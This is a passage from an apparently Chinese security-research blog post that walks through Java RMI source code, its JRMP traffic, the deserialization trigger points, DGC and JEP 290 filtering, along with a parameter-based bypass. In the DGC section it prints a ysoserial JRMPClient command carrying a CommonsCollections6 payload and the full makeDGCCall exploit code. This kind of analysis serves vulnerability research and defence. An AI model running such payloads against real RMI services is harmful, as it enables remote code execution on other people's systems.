            tcpLog.log(Log.VERBOSE, &quot;(port &quot; + port +
                &quot;) client using &quot; + clientHost + &quot;:&quot; + clientPort);
        &#125;

        // create dummy channel for receiving messages
        // (why not use clientHost and clientPort?)
        ep = new TCPEndpoint(remoteHost, socket.getLocalPort(),
                                endpoint.getClientSocketFactory(),
                                endpoint.getServerSocketFactory());
        ch = new TCPChannel(TCPTransport.this, ep);
        conn = new TCPConnection(ch, socket, bufIn, bufOut);

        // read input messages
        handleMessages(conn, true);
        break;
</code></pre>
<p>protocal是0x4b(75)，对应的第二个case分支，在这个case里面，可以看到前面先发送了ack,包含host，port和一个ack标志。</p>
<pre><code>out.writeByte(TransportConstants.ProtocolAck);//78（0x4e）
out.writeUTF(remoteHost);
out.writeInt(remotePort);
out.flush();
</code></pre>
<p>对应wireshark第二个数据包<br><img src="/images/20230422221503.png"></p>
<p>然后下面它又重新封装了一个TCPConnection对象传入handleMessage函数中。</p>
<pre><code>void handleMessages(Connection conn, boolean persistent) &#123;
    int port = getEndpoint().getPort();

    try &#123;
        DataInputStream in = new DataInputStream(conn.getInputStream());
        do &#123;
            int op = in.read();     // transport op
            if (op == -1) &#123;
                if (tcpLog.isLoggable(Log.BRIEF)) &#123;
                    tcpLog.log(Log.BRIEF, &quot;(port &quot; +
                        port + &quot;) connection closed&quot;);
                &#125;
                break;
            &#125;

            if (tcpLog.isLoggable(Log.BRIEF)) &#123;
                tcpLog.log(Log.BRIEF, &quot;(port &quot; + port +
                    &quot;) op = &quot; + op);
            &#125;

            switch (op) &#123;
                case TransportConstants.Call:
                // service incoming RMI call
                RemoteCall call = new StreamRemoteCall(conn);
                if (serviceCall(call) == false)
                    return;
                break;
</code></pre>
<p>这个方法监听客户端请求，进入对应case，这里的请求是Call，所以进入第一个分支。先是创建了一个StreamRemoteCall对象，然后执行serviceCall(call)</p>
<pre><code>    public boolean serviceCall(final RemoteCall call) &#123;
        try &#123;
            /* read object id */
            final Remote impl;
            ObjID id;

            try &#123;
                id = ObjID.read(call.getInputStream());
            &#125; catch (java.io.IOException e) &#123;
                throw new MarshalException(&quot;unable to read objID&quot;, e);
            &#125;

            /* get the remote object */
            Transport transport = id.equals(dgcID) ? null : this;
            Target target =
                ObjectTable.getTarget(new ObjectEndpoint(id, transport));

            if (target == null || (impl = target.getImpl()) == null) &#123;
                throw new NoSuchObjectException(&quot;no such object in table&quot;);
            &#125;

            final Dispatcher disp = target.getDispatcher();
            target.incrementCallCount();
            try &#123;
                /* call the dispatcher */
                transportLog.log(Log.VERBOSE, &quot;call dispatcher&quot;);

                final AccessControlContext acc =
                    target.getAccessControlContext();
                ClassLoader ccl = target.getContextClassLoader();

                ClassLoader savedCcl = Thread.currentThread().getContextClassLoader();

                try &#123;
                    setContextClassLoader(ccl);
                    currentTransport.set(this);
                    try &#123;
                        java.security.AccessController.doPrivileged(
                            new java.security.PrivilegedExceptionAction&lt;Void&gt;() &#123;
                            public Void run() throws IOException &#123;
                                checkAcceptPermission(acc);
                                disp.dispatch(impl, call);
                                return null;
                            &#125;
                        &#125;, acc);
                    &#125; catch (java.security.PrivilegedActionException pae) &#123;
                        throw (IOException) pae.getException();
                    &#125;
                &#125; finally &#123;
                    setContextClassLoader(savedCcl);
                    currentTransport.set(null);
                &#125;

            &#125; catch (IOException ex) &#123;
                transportLog.log(Log.BRIEF,
                                &quot;exception thrown by dispatcher: &quot;, ex);
                return false;
            &#125; finally &#123;
                target.decrementCallCount();
            &#125;

        &#125; catch (RemoteException e) &#123;

            // if calls are being logged, write out exception
            if (UnicastServerRef.callLog.isLoggable(Log.BRIEF)) &#123;
                // include client host name if possible
                String clientHost = &quot;&quot;;
                try &#123;
                    clientHost = &quot;[&quot; +
                        RemoteServer.getClientHost() + &quot;] &quot;;
                &#125; catch (ServerNotActiveException ex) &#123;
                &#125;
                String message = clientHost + &quot;exception: &quot;;
                UnicastServerRef.callLog.log(Log.BRIEF, message, e);
            &#125;
            try &#123;
                ObjectOutput out = call.getResultStream(false);
                UnicastServerRef.clearStackTraces(e);
                out.writeObject(e);
                call.releaseOutputStream();

            &#125; catch (IOException ie) &#123;
                transportLog.log(Log.BRIEF,
                    &quot;exception thrown marshalling exception: &quot;, ie);
                return false;
            &#125;
        &#125;

        return true;
    &#125;
&#125;
</code></pre>
<p>前面我们在创建代理对象的时候每个stub最后都被封装到了Target对象中最后保存到了静态对象ObjectTable.objTable中。这个函数里面开始根据id，transport获取了RegistryImpl_Stub对应的target，然后下面获取dispatcher，实际上就是UnicastServerRef对象。然后调用了disp.dispatch(impl, call)，impl是从target中获取的，call是前面传递的函数参数。</p>
<pre><code>public void dispatch(Remote obj, RemoteCall call) throws IOException &#123;
    // positive operation number in 1.1 stubs;
    // negative version number in 1.2 stubs and beyond...
    int num;
    long op;

    try &#123;
        // read remote call header
        ObjectInput in;
        try &#123;
            in = call.getInputStream();
            num = in.readInt();
        &#125; catch (Exception readEx) &#123;
            throw new UnmarshalException(&quot;error unmarshalling call header&quot;,
                                         readEx);
        &#125;
        if (skel != null) &#123;
            // If there is a skeleton, use it
                oldDispatch(obj, call, num);
                return;

        &#125; else if (num &gt;= 0)&#123;
            throw new UnmarshalException(
                    &quot;skeleton class not found but required for client version&quot;);
        &#125;
        try &#123;
            op = in.readLong();
        &#125; catch (Exception readEx) &#123;
            throw new UnmarshalException(&quot;error unmarshalling call header&quot;,
                    readEx);
        &#125;
</code></pre>
<p>先读取了call数据包中的操作码，判断客户端是查询对象还是绑定远程对象或者解绑等操作。</p>
<pre><code>num = in.readInt();
</code></pre>
<p>如果skel不为空（RegistryImpl_Skel对象），调用oldDispatch()</p>
<pre><code>private void oldDispatch(Remote obj, RemoteCall call, int op)
    throws Exception
&#123;
    long hash;              // hash for matching stub with skeleton

    // read remote call header
    ObjectInput in;
    in = call.getInputStream();
    try &#123;
        Class&lt;?&gt; clazz = Class.forName(&quot;sun.rmi.transport.DGCImpl_Skel&quot;);
        if (clazz.isAssignableFrom(skel.getClass())) &#123;
            ((MarshalInputStream)in).useCodebaseOnly();
        &#125;
    &#125; catch (ClassNotFoundException ignore) &#123; &#125;

    try &#123;
        hash = in.readLong();
    &#125; catch (Exception ioe) &#123;
        throw new UnmarshalException(&quot;error unmarshalling call header&quot;, ioe);
    &#125;

    // if calls are being logged, write out object id and operation
    Operation[] operations = skel.getOperations();
    logCall(obj, op &gt;= 0 &amp;&amp; op &lt; operations.length ?  operations[op] : &quot;op: &quot; + op);
    unmarshalCustomCallData(in);
    // dispatch to skeleton for remote object
    skel.dispatch(obj, call, op, hash);
&#125;
</code></pre>
<p>主要是调用skel.dispatch(obj, call, op, hash)<br>obj就是前面从target中获取的RegistryImpl_Stub,call是前面创建的客户端连接，op是前面读取的操作数，hash是读取的序列化对象的hash值，用于在反序列化前判断。</p>
<pre><code>public void dispatch(java.rmi.Remote obj, java.rmi.server.RemoteCall remoteCall, int opnum, long hash)
        throws java.lang.Exception &#123;
    if (opnum &lt; 0) &#123;
        if (hash == 7583982177005850366L) &#123;
            opnum = 0;
        &#125; else if (hash == 2571371476350237748L) &#123;
            opnum = 1;
        &#125; else if (hash == -7538657168040752697L) &#123;
            opnum = 2;
        &#125; else if (hash == -8381844669958460146L) &#123;
            opnum = 3;
        &#125; else if (hash == 7305022919901907578L) &#123;
            opnum = 4;
        &#125; else &#123;
            throw new java.rmi.UnmarshalException(&quot;invalid method hash&quot;);
        &#125;
    &#125; else &#123;
        if (hash != interfaceHash)
            throw new java.rmi.server.SkeletonMismatchException(&quot;interface hash mismatch&quot;);
    &#125;

    sun.rmi.registry.RegistryImpl server = (sun.rmi.registry.RegistryImpl) obj;
    StreamRemoteCall call = (StreamRemoteCall) remoteCall;
    switch (opnum) &#123;
        case 0: // bind(String, Remote)
        &#123;
            // Check access before reading the arguments
            RegistryImpl.checkAccess(&quot;Registry.bind&quot;);

            java.lang.String $param_String_1;
            java.rmi.Remote $param_Remote_2;
            try &#123;
                ObjectInputStream in = (ObjectInputStream)call.getInputStream();
                $param_String_1 =
                        SharedSecrets.getJavaObjectInputStreamReadString().readString(in);
                $param_Remote_2 = (java.rmi.Remote) in.readObject();
            &#125; catch (ClassCastException | IOException | ClassNotFoundException e) &#123;
                call.discardPendingRefs();
                throw new java.rmi.UnmarshalException(&quot;error unmarshalling arguments&quot;, e);
            &#125; finally &#123;
                call.releaseInputStream();
            &#125;
            server.bind($param_String_1, $param_Remote_2);
            try &#123;
                call.getResultStream(true);
            &#125; catch (java.io.IOException e) &#123;
                throw new java.rmi.MarshalException(&quot;error marshalling return&quot;, e);
            &#125;
            break;
        &#125;

        case 1: // list()
        &#123;
            call.releaseInputStream();
            java.lang.String[] $result = server.list();
            try &#123;
                java.io.ObjectOutput out = call.getResultStream(true);
                out.writeObject($result);
            &#125; catch (java.io.IOException e) &#123;
                throw new java.rmi.MarshalException(&quot;error marshalling return&quot;, e);
            &#125;
            break;
        &#125;

        case 2: // lookup(String)
        &#123;
            java.lang.String $param_String_1;
            try &#123;
                ObjectInputStream in = (ObjectInputStream)call.getInputStream();
                $param_String_1 =
                        SharedSecrets.getJavaObjectInputStreamReadString().readString(in);
            &#125; catch (ClassCastException | IOException e) &#123;
                call.discardPendingRefs();
                throw new java.rmi.UnmarshalException(&quot;error unmarshalling arguments&quot;, e);
            &#125; finally &#123;
                call.releaseInputStream();
            &#125;
            java.rmi.Remote $result = server.lookup($param_String_1);
            try &#123;
                java.io.ObjectOutput out = call.getResultStream(true);
                out.writeObject($result);
            &#125; catch (java.io.IOException e) &#123;
                throw new java.rmi.MarshalException(&quot;error marshalling return&quot;, e);
            &#125;
            break;
        &#125;

        case 3: // rebind(String, Remote)
        &#123;
            // Check access before reading the arguments
            RegistryImpl.checkAccess(&quot;Registry.rebind&quot;);

            java.lang.String $param_String_1;
            java.rmi.Remote $param_Remote_2;
            try &#123;
                ObjectInputStream in = (ObjectInputStream)call.getInputStream();
                $param_String_1 =
                        SharedSecrets.getJavaObjectInputStreamReadString().readString(in);
                $param_Remote_2 = (java.rmi.Remote) in.readObject();
            &#125; catch (ClassCastException | IOException | java.lang.ClassNotFoundException e) &#123;
                call.discardPendingRefs();
                throw new java.rmi.UnmarshalException(&quot;error unmarshalling arguments&quot;, e);
            &#125; finally &#123;
                call.releaseInputStream();
            &#125;
            server.rebind($param_String_1, $param_Remote_2);
            try &#123;
                call.getResultStream(true);
            &#125; catch (java.io.IOException e) &#123;
                throw new java.rmi.MarshalException(&quot;error marshalling return&quot;, e);
            &#125;
            break;
        &#125;

        case 4: // unbind(String)
        &#123;
            // Check access before reading the arguments
            RegistryImpl.checkAccess(&quot;Registry.unbind&quot;);

            java.lang.String $param_String_1;
            try &#123;
                ObjectInputStream in = (ObjectInputStream)call.getInputStream();
                $param_String_1 =
                        SharedSecrets.getJavaObjectInputStreamReadString().readString(in);
            &#125; catch (ClassCastException | IOException e) &#123;
                call.discardPendingRefs();
                throw new java.rmi.UnmarshalException(&quot;error unmarshalling arguments&quot;, e);
            &#125; finally &#123;
                call.releaseInputStream();
            &#125;
            server.unbind($param_String_1);
            try &#123;
                call.getResultStream(true);
            &#125; catch (java.io.IOException e) &#123;
                throw new java.rmi.MarshalException(&quot;error marshalling return&quot;, e);
            &#125;
            break;
        &#125;

        default:
            throw new java.rmi.UnmarshalException(&quot;invalid method number&quot;);
    &#125;
&#125;
</code></pre>
<p>}</p>
<p>通过hash值判断进入哪个case，这里进入case2(实际就是lookup的逻辑)，server是obj强转后的RegistryImpl对象，调用它的lookup方法得到$result</p>
<pre><code>java.rmi.Remote $result = server.lookup($param_String_1);
</code></pre>
<p>然后写入输出流中</p>
<pre><code>out.writeObject($result);
</code></pre>
<p>执行完后回到dispatch中的finnally语句，将输出流中的数据发送出去。</p>
<pre><code>call.releaseInputStream(); // in case skeleton doesn&#39;t
call.releaseOutputStream();
</code></pre>
<p>但是客户端读取到的是代理对象，而服务端当时调用bind绑定的是远程对象，原因是我们进入writeOject方法</p>
<pre><code>public final void writeObject(Object obj) throws IOException &#123;
    if (enableOverride) &#123;
        writeObjectOverride(obj);
        return;
    &#125;
    try &#123;
        writeObject0(obj, false);
    &#125; catch (IOException ex) &#123;
        if (depth == 0) &#123;
            writeFatalException(ex);
        &#125;
        throw ex;
    &#125;
&#125;
</code></pre>
<p>其中调用了writeObject0方法，继续进入</p>
<pre><code>if (enableReplace) &#123;
    Object rep = replaceObject(obj);
    if (rep != obj &amp;&amp; rep != null) &#123;
        cl = rep.getClass();
        desc = ObjectStreamClass.lookup(cl, true);
    &#125;
    obj = rep;
&#125;
</code></pre>
<p>主要关注到其中调用了replaceObject方法，可能里面返回了对应的代理对象，进入replaceObject方法</p>
<pre><code>protected final Object replaceObject(Object obj) throws IOException &#123;
    if ((obj instanceof Remote) &amp;&amp; !(obj instanceof RemoteStub)) &#123;
        Target target = ObjectTable.getTarget((Remote) obj);
        if (target != null) &#123;
            return target.getStub();
        &#125;
    &#125;
    return obj;
&#125;
</code></pre>
<p>使用远程对象在ObjectTable中查找了其对应的代理对象，并返回，所以我们客户端获取到的是代理对象。</p>
<pre><code>Target target = ObjectTable.getTarget((Remote) obj)
return target.getStub();
</code></pre>
<p>客户端执行代理对象：</p>
<p>上面执行完后，客户端成功获取到了代理对象，如果我们想要执行对象的方法，就在对应的RemoteObjectInvocationHandler代理类的invoke方法中</p>
<pre><code>public Object invoke(Object proxy, Method method, Object[] args)
    throws Throwable
&#123;
    if (! Proxy.isProxyClass(proxy.getClass())) &#123;
        throw new IllegalArgumentException(&quot;not a proxy&quot;);
    &#125;

    if (Proxy.getInvocationHandler(proxy) != this) &#123;
        throw new IllegalArgumentException(&quot;handler mismatch&quot;);
    &#125;

    if (method.getDeclaringClass() == Object.class) &#123;
        return invokeObjectMethod(proxy, method, args);
    &#125; else if (&quot;finalize&quot;.equals(method.getName()) &amp;&amp; method.getParameterCount() == 0) &#123;
        return null; // ignore
    &#125; else &#123;
        return invokeRemoteMethod(proxy, method, args);
    &#125;
&#125;
</code></pre>
<p>可以看到前面做了一些判断，然后判断调用的方法是否存在Object对象中(如hashcode，toString等)，这些方法可以就在本地调用。其他的方法就调用invokeRemoteMethod(proxy, method, args)实现远程调用。跟进invokeRemoteMethod()方法可以看到它主要调用了UnicastRef.invoke()方法，继续跟进。</p>
<pre><code>return ref.invoke((Remote) proxy, method, args,
                    getMethodHash(method));
</code></pre>
<p>在这个函数中使用JRMP协议调用远程对象的方法，协议交互过程和lookup类似，先创建一个连接</p>
<pre><code>call = new StreamRemoteCall(conn, ref.getObjID(), -1, opnum);
</code></pre>
<p>自定义握手过程，然后将param通过marshalValue()方法序列化写入输出流</p>
<pre><code>ObjectOutput out = call.getOutputStream();
marshalCustomCallData(out);
Class&lt;?&gt;[] types = method.getParameterTypes();
for (int i = 0; i &lt; types.length; i++) &#123;
    marshalValue(types[i], params[i], out);
&#125;
</code></pre>
<p>然后调用call.executeCall()将参数发送给服务端，然后判断返回值，如果是void就直接返回null，本次调用结束，否则调用unmarshalValue()获取返回值最后释放连接返回结果。</p>
<pre><code>Class&lt;?&gt; rtype = method.getReturnType();
if (rtype == void.class)
    return null;
ObjectInput in = call.getInputStream();

/* StreamRemoteCall.done() does not actually make use
* of conn, therefore it is safe to reuse this
* connection before the dirty call is sent for
* registered refs.
*/
Object returnValue = unmarshalValue(rtype, in);
...
ref.getChannel().free(conn, true);
return returnValue;
</code></pre>
<h3 id="流量总结"><a href="#流量总结" class="headerlink" title="流量总结"></a>流量总结</h3><p>客户端：<br>第一个数据包：</p>
<pre><code>sun.rmi.transport.tcp.TCPChannel#createConnection

dataOut.writeInt(TransportConstants.Magic);//0x4a524d49
dataOut.writeShort(TransportConstants.Version);//2
out.writeByte(TransportConstants.StreamProtocol);//0x4b
</code></pre>
<p>第二个数据包：</p>
<pre><code>sun.rmi.transport.tcp.TCPChannel#createConnection

out.writeUTF(localEp.getHost());
out.writeInt(localEp.getPort());
</code></pre>
<p>第三个数据包：</p>
<pre><code>conn.getOutputStream().write(TransportConstants.Call);//0x50
out.writeInt(op);//2
out.writeLong(hash); //4905912898345647071L
var3.writeObject(var1);//remote
</code></pre>
<p>DGC：</p>
<p>第四个数据包：</p>
<pre><code>sun.rmi.transport.tcp.TCPChannel#createConnection

dataOut.writeInt(TransportConstants.Magic);//0x4a524d49
dataOut.writeShort(TransportConstants.Version);//2
out.writeByte(TransportConstants.StreamProtocol);//0x4b
</code></pre>
<p>第五个数据包：</p>
<pre><code>sun.rmi.transport.tcp.TCPChannel#createConnection

out.writeUTF(localEp.getHost());
out.writeInt(localEp.getPort());
</code></pre>
<p>第六个数据包：</p>
<pre><code>sun.rmi.transport.ConnectionInputStream#done

var5.writeByte(84);

//count = -32723
//time = 1682244482248
//unique = -681994373
out.writeInt(unique);
out.writeLong(time);
out.writeShort(count);
</code></pre>
<p>服务端：</p>
<p>第一个响应包：</p>
<pre><code>int var6 = var5.readInt();//1246907721
short var7 = var5.readShort();//2
byte var15 = var5.readByte();//75
var10.writeByte(78);
var10.writeUTF(this.remoteHost);//127.0.0.1
var10.writeInt(var11);//1102 this.socket.getPort();
</code></pre>
<p>lookup响应包：</p>
<pre><code>sun.rmi.transport.tcp.TCPTransport#handleMessages
int var5 = var4.read();//80
var1.getInputStream();
var39 = ObjID.read(var1.getInputStream());

sun.rmi.server.UnicastServerRef#dispatch
var3 = var41.readInt();//操作码2

sun.rmi.server.UnicastServerRef#oldDispatch
var4 = var6.readLong();//hash值

sun.rmi.registry.RegistryImpl_Skel#dispatch

var8 = SharedSecrets.getJavaObjectInputStreamReadString().readString(var9);//remote

注意：java.io.ObjectOutputStream#writeObject0
中的replaceObject(obj)将var81替换成了代理对象

var83.writeObject(var81);//
</code></pre>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>对于客户端而言反序列化漏洞的利用点主要有下面几个地方</p>
<ul>
<li>StreamRemoteCall.executeCall()中当this.in.readByte()为2时(line:169)</li>
<li>RegistryImpl_Stub.lookup()读取服务端返回的代理对象(line:104)</li>
<li>客户端读取服务端执行结果返回值(UnicastRef.unmarshalValue:302)</li>
</ul>
<p>对于服务端而言可能产生反序列化漏洞的利用点主要有下面几个地方</p>
<ul>
<li>服务端读取客户端(查询&#x2F;绑定&#x2F;解绑)对象字符串(RegistryImpl_Skel.dispatch)</li>
<li>服务端读取客户端远程方法的参数值(UnicastServerRef.unmarshalValue:151)</li>
</ul>
<p>对于DGC而言</p>
<ul>
<li>sun.rmi.transport.DGCImpl_Stub#dirty DGC客户端的dirty操作中会调用ref.invoke（line:73）</li>
<li>sun.rmi.transport.DGCImpl_Skel#dispatch DGC服务端的dispatch处理</li>
</ul>
<h2 id="DGC详解"><a href="#DGC详解" class="headerlink" title="DGC详解"></a>DGC详解</h2><p>DGC（Distributed Garbage Collection）—— 分布式垃圾回收，当 Server 端返回一个对象到 Client 端（远程方法的调用方）时，其跟踪远程对象在 Client 端中的使用。当再没有更多的对 Client 远程对象的引用时，或者如果引用的“租借”过期并且没有更新，服务器将垃圾回收远程对象。启动一个 RMI 服务，就会伴随着 DGC 服务端的启动。</p>
<p>很像 Registry、RegistryImpl、RegistryImpl_Stub、RegistryImpl_Skel，实际上不单是命名相近，处理逻辑也是类似的。通过在服务端和客户端之间传递引用，依旧是 Stub 与 Skel 之间的通信模式：Server 端启动 DGCImpl，在 Registry 端注册 DGCImpl_Stub ，Client 端获取到 DGCImpl_Stub，通过其与 Server 端通信，Server 端使用 RegistryImpl_Skel 来处理。</p>
<p>DGC 通信的处理类是 DGCImpl_Skel 的 dispatch 方法，依旧通过 Java 原生的序列化和反序列化来处理对象。</p>
<pre><code>switch (opnum) &#123;
    case 0: // clean(ObjID[], long, VMID, boolean)
    &#123;
        java.rmi.server.ObjID[] $param_arrayOf_ObjID_1;
        long $param_long_2;
        java.rmi.dgc.VMID $param_VMID_3;
        boolean $param_boolean_4;
        try &#123;
            java.io.ObjectInput in = call.getInputStream();
            $param_arrayOf_ObjID_1 = (java.rmi.server.ObjID[]) in.readObject();
            $param_long_2 = in.readLong();
            $param_VMID_3 = (java.rmi.dgc.VMID) in.readObject();
            $param_boolean_4 = in.readBoolean();
        &#125; catch (ClassCastException | IOException | ClassNotFoundException e) &#123;
            call.discardPendingRefs();
            throw new java.rmi.UnmarshalException(&quot;error unmarshalling arguments&quot;, e);
        &#125; finally &#123;
            call.releaseInputStream();
        &#125;
        server.clean($param_arrayOf_ObjID_1, $param_long_2, $param_VMID_3, $param_boolean_4);
        try &#123;
            call.getResultStream(true);
        &#125; catch (java.io.IOException e) &#123;
            throw new java.rmi.MarshalException(&quot;error marshalling return&quot;, e);
        &#125;
        break;
    &#125;

    case 1: // dirty(ObjID[], long, Lease)
    &#123;
        java.rmi.server.ObjID[] $param_arrayOf_ObjID_1;
        long $param_long_2;
        java.rmi.dgc.Lease $param_Lease_3;
        try &#123;
            java.io.ObjectInput in = call.getInputStream();
            $param_arrayOf_ObjID_1 = (java.rmi.server.ObjID[]) in.readObject();
            $param_long_2 = in.readLong();
            $param_Lease_3 = (java.rmi.dgc.Lease) in.readObject();
        &#125; catch (ClassCastException | IOException | ClassNotFoundException e) &#123;
            call.discardPendingRefs();
            throw new java.rmi.UnmarshalException(&quot;error unmarshalling arguments&quot;, e);
        &#125; finally &#123;
            call.releaseInputStream();
        &#125;
        java.rmi.dgc.Lease $result = server.dirty($param_arrayOf_ObjID_1, $param_long_2, $param_Lease_3);
        try &#123;
            java.io.ObjectOutput out = call.getResultStream(true);
            out.writeObject($result);
        &#125; catch (java.io.IOException e) &#123;
            throw new java.rmi.MarshalException(&quot;error marshalling return&quot;, e);
        &#125;
        break;
    &#125;

    default:
        throw new java.rmi.UnmarshalException(&quot;invalid method number&quot;);
&#125;
</code></pre>
<p> 漏洞的触发点也就是这里的readObject，在clean之前对我们传的值做反序列化的操作，原理很简单，主要是解决如何和DGC服务端通信的问题。</p>
<p>客户端DGCImpl_Stub#clean:</p>
<pre><code>public void clean(java.rmi.server.ObjID[] $param_arrayOf_ObjID_1, long $param_long_2, java.rmi.dgc.VMID $param_VMID_3, boolean $param_boolean_4)
        throws java.rmi.RemoteException &#123;
    try &#123;
        StreamRemoteCall call = (StreamRemoteCall)ref.newCall((java.rmi.server.RemoteObject) this,
                operations, 0, interfaceHash);
        call.setObjectInputFilter(DGCImpl_Stub::leaseFilter);
        try &#123;
            java.io.ObjectOutput out = call.getOutputStream();
            out.writeObject($param_arrayOf_ObjID_1);
            out.writeLong($param_long_2);
            out.writeObject($param_VMID_3);
            out.writeBoolean($param_boolean_4);
        &#125; catch (java.io.IOException e) &#123;
            throw new java.rmi.MarshalException(&quot;error marshalling arguments&quot;, e);
        &#125;
        ref.invoke(call);
        ref.done(call);
    &#125; catch (java.lang.RuntimeException e) &#123;
        throw e;
    &#125; catch (java.rmi.RemoteException e) &#123;
        throw e;
    &#125; catch (java.lang.Exception e) &#123;
        throw new java.rmi.UnexpectedException(&quot;undeclared checked exception&quot;, e);
    &#125;
&#125;
</code></pre>
<p>java.rmi.server.ObjID[] $param_arrayOf_ObjID_1做的序列化操作在DGCImpl_Skel#dispatch中会进行反序列化操作，那么只需要把ObjID[]替换为我们的payload即可达成利用，然而需要更改底层代码这种繁杂的操作yso早已替我们实现——ysoserial.exploit.JRMPClient#makeDGCCall:</p>
<blockquote>
<p>java -cp ysoserial.jar ysoserial.exploit.JRMPClient 127.0.0.1 1099 CommonsCollections6 “calc”</p>
</blockquote>
<pre><code>public static void makeDGCCall ( String hostname, int port, Object payloadObject ) throws IOException, UnknownHostException, SocketException &#123;
    InetSocketAddress isa = new InetSocketAddress(hostname, port);
    Socket s = null;
    DataOutputStream dos = null;
    try &#123;
        s = SocketFactory.getDefault().createSocket(hostname, port);
        s.setKeepAlive(true);
        s.setTcpNoDelay(true);

        OutputStream os = s.getOutputStream();
        dos = new DataOutputStream(os);

        dos.writeInt(TransportConstants.Magic);
        dos.writeShort(TransportConstants.Version);
        dos.writeByte(TransportConstants.SingleOpProtocol);

        dos.write(TransportConstants.Call);

        @SuppressWarnings ( &quot;resource&quot; )
        final ObjectOutputStream objOut = new MarshalOutputStream(dos);

        objOut.writeLong(2); // DGC
        objOut.writeInt(0);
        objOut.writeLong(0);
        objOut.writeShort(0);

        objOut.writeInt(1); // dirty
        objOut.writeLong(-669196253586618813L);
        
        objOut.writeObject(payloadObject);

        os.flush();
    &#125;
    finally &#123;
        if ( dos != null ) &#123;
            dos.close();
        &#125;
        if ( s != null ) &#123;
            s.close();
        &#125;
    &#125;
</code></pre>
<h2 id="JEP290详解与绕过"><a href="#JEP290详解与绕过" class="headerlink" title="JEP290详解与绕过"></a>JEP290详解与绕过</h2><h3 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h3><p>EP290 是 Java 底层为了缓解反序列化攻击提出的一种解决方案，描述网址<a href="https://openjdk.java.net/jeps/290">点这里</a>。这是一个针对 JAVA 9 提出的安全特性，但同时对 JDK 6,7,8 都进行了支持，在 JDK 6u141、JDK 7u131、JDK 8u121 版本进行了更新。</p>
<p>JEP 290 主要提供了几个机制：</p>
<ul>
<li>提供了一种灵活的机制，将可反序列化的类从任意类限制为上下文相关的类（黑白名单）；</li>
<li>限制反序列化的调用深度和复杂度；</li>
<li>为 RMI export 的对象设置了验证机制；</li>
<li>提供一个全局过滤器，可以在 properties 或配置文件中进行配置。</li>
</ul>
<p>白名单如下：</p>
<pre><code>java.rmi.Remote
java.lang.Number
java.lang.reflect.Proxy
java.rmi.server.UnicastRef
java.rmi.activation.ActivationId
java.rmi.server.UID
java.rmi.server.RMIClientSocketFactory
java.rmi.server.RMIServerSocketFactory
</code></pre>
<p>原理：<br>server端在反序列化前会调用serialfilter来检查info，而这个serialfilter是通过UnicastServerRef#unmarshalCustomCallData用UnicastServerRef.this.filter设置的</p>
<pre><code>protected void unmarshalCustomCallData(ObjectInput var1) throws IOException, ClassNotFoundException &#123;
    if (this.filter != null &amp;&amp; var1 instanceof ObjectInputStream) &#123;
        final ObjectInputStream var2 = (ObjectInputStream)var1;
        AccessController.doPrivileged(new PrivilegedAction&lt;Void&gt;() &#123;
            public Void run() &#123;
                Config.setObjectInputFilter(var2, UnicastServerRef.this.filter);
                return null;
            &#125;
        &#125;);
    &#125;

&#125;
</code></pre>
<p>UnicastServerRef.this.filter是在实例化RegistryImpl时，</p>
<pre><code>new UnicastServerRef(var1x, (var0) -&gt; &#123;
                        return RegistryImpl.registryFilter(var0);
                    &#125;)
</code></pre>
<p>中有个方法应用RegistryImpl::registryFilter，当调用ObjectInputFilter接口checkInput时，相当于</p>
<pre><code>return RegistryImpl.registryFilter(FilterInfo var1);
</code></pre>
<p>跟进registryFilter就是我们上述的白名单过滤</p>
<pre><code>private static ObjectInputFilter.Status registryFilter(ObjectInputFilter.FilterInfo var0) &#123;
    if (registryFilter != null) &#123;
        ObjectInputFilter.Status var1 = registryFilter.checkInput(var0);
        if (var1 != Status.UNDECIDED) &#123;
            return var1;
        &#125;
    &#125;

    if (var0.depth() &gt; (long)REGISTRY_MAX_DEPTH) &#123;
        return Status.REJECTED;
    &#125; else &#123;
        Class var2 = var0.serialClass();
        if (var2 == null) &#123;
            return Status.UNDECIDED;
        &#125; else &#123;
            if (var2.isArray()) &#123;
                if (var0.arrayLength() &gt;= 0L &amp;&amp; var0.arrayLength() &gt; (long)REGISTRY_MAX_ARRAY_SIZE) &#123;
                    return Status.REJECTED;
                &#125;

                do &#123;
                    var2 = var2.getComponentType();
                &#125; while(var2.isArray());
            &#125;

            if (var2.isPrimitive()) &#123;
                return Status.ALLOWED;
            &#125; else &#123;
                return String.class != var2 &amp;&amp; !Number.class.isAssignableFrom(var2) &amp;&amp; !Remote.class.isAssignableFrom(var2) &amp;&amp; !Proxy.class.isAssignableFrom(var2) &amp;&amp; !UnicastRef.class.isAssignableFrom(var2) &amp;&amp; !RMIClientSocketFactory.class.isAssignableFrom(var2) &amp;&amp; !RMIServerSocketFactory.class.isAssignableFrom(var2) &amp;&amp; !ActivationID.class.isAssignableFrom(var2) &amp;&amp; !UID.class.isAssignableFrom(var2) ? Status.REJECTED : Status.ALLOWED;
            &#125;
        &#125;
    &#125;
&#125;
</code></pre>
<h3 id="Object参数方法绕过"><a href="#Object参数方法绕过" class="headerlink" title="Object参数方法绕过"></a>Object参数方法绕过</h3><p>如果服务端”绑定”了一个对象，他的方法参数类型是Object 类型的方法时，则可以绕过 JEP 290。</p>
<h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><p>我们知道，Registry端在实例化UnicastServerRef 对象的时候会传入<code>RegistryImpl.registryFilter</code>过滤器。</p>
<p><img src="/images/20230429222815.png"></p>
<p>但是，初始化普通对象<code>RemoteInterfaceImpl remote = new RemoteInterfaceImpl();</code>的时候不会</p>
<p>我们跟进实例化的过程，这个我们自定义的类会继承<code>UnicastRemoteObject</code>实例化的时候调用父类的构造器</p>
<p><img src="/images/20230429222941.png"></p>
<p>父类构造器中调用参数为port的有参构造器</p>
<p><img src="/images/20230429223024.png"></p>
<p>调用exportObject进行初始化</p>
<p><img src="/images/20230429223101.png"></p>
<p>发现实例化<code>UnicastServerRef</code>的时候没有传入filter</p>
<p><img src="/images/20230429223140.png"></p>
<p><img src="/images/20230429223239.png"></p>
<p>封装Target的时候skel为空，filter为空</p>
<p>服务端处理请求：<br>来到Transport#serviceCall，首先从输入流中读取 id , 匹配到 RegistryImpl 对象对应的 Target ，然后取出Target中的UnicastServerRef，调用dispatch。</p>
<pre><code>try &#123;
    var39 = ObjID.read(var1.getInputStream());
&#125; catch (IOException var33) &#123;
    throw new MarshalException(&quot;unable to read objID&quot;, var33);
&#125;

